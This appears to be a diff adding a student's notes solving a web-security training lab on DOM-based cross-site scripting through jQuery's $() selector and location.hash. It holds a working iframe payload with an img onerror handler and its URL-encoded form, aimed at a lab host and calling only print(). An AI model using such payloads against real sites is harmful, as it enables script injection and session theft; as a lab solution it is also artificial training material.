@@ -1,0 +1,10 @@
+This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.
+
+To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.
+
+
+payload: <iframe src="https://0ada007103126a30c0ae34fb00a6005d.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+https://0ada007103126a30c0ae34fb00a6005d.web-security-academy.net/#
+
+url: https://0ada007103126a30c0ae34fb00a6005d.web-security-academy.net/#%3Cimg%20src=x%20onerror=print()%3E
